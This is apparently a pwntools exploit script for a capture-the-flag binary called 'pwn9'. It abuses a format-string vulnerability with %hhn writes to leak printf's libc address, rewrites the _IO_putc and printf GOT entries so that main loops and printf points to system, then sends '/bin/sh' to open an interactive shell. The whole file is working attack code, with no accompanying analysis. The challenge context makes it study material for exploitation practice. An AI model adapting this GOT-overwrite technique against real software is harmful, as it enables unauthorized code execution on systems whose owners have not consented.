from pwn import *

#context.log_level = 'debug'

#p = remote('ctf.cnss.studio', 5009)
p = process('./pwn9')

context.terminal = ['gnome-terminal','-x','sh','-c']
gdb.attach(proc.pidof(p)[0])

#libc_elf = ELF('libc')
libc_elf = ELF('libc-2.23.so')
p_elf = ELF('pwn9')

main_entry = 0x80483c0

printf_got_addr = p_elf.got['printf']
print 'printf_got_addr = ' + hex(printf_got_addr)
putc_got_addr = p_elf.got['_IO_putc']

system_offset = libc_elf.symbols['system']
printf_offset = libc_elf.symbols['printf']

### call main #1 ###
# Get entry of printf via calling printf
# and change GOT value of _IO_putc into main_entry.
cb = main_entry
a3 = (cb >> 24) & 0xff
a2 = (cb >> 16) & 0xff
a1 = (cb >> 8) & 0xff
a0 = cb & 0xff

payload = p32(printf_got_addr)
payload += p32(putc_got_addr)
payload += p32(putc_got_addr+1)
payload += p32(putc_got_addr+2)
payload += p32(putc_got_addr+3)
payload += '%' + str(a0-20) + 'x%5$hhn'
payload += '%' + str(0x100+(a1-a0)) + 'x%6$hhn'
payload += '%' + str(0x100+(a2-a1)) + 'x%7$hhn'
payload += '%' + str(0x100+(a3-a2)) + 'x%8$hhn'
payload += '|%4$.4s'

p.sendline(payload)
p.recvuntil('|')
printf_entry = u32(p.recv(4))
print 'printf_entry = ' + hex(printf_entry)

### call main #2 ###
# Change GOT value of printf into system entry
system_entry = printf_entry - (printf_offset - system_offset)
print 'system_entry = ' + hex(system_entry)

cb = system_entry
a3 = (cb >> 24) & 0xff
a2 = (cb >> 16) & 0xff
a1 = (cb >> 8) & 0xff
a0 = cb & 0xff

payload = p32(printf_got_addr)
payload += p32(printf_got_addr+1)
payload += p32(printf_got_addr+2)
payload += p32(printf_got_addr+3)

payload += '%' + str((a0-16) % 0x100) + 'x%4$hhn'
payload += '%' + str((a1-a0) % 0x100) + 'x%5$hhn'
payload += '%' + str((a2-a1) % 0x100) + 'x%6$hhn'
payload += '%' + str((a3-a2) % 0x100) + 'x%7$hhn'

p.sendline(payload)
p.recvline();

### call main #3 ###
# Get shell this time
payload = '/bin/sh' + '\0'
p.send(payload)
p.interactive()
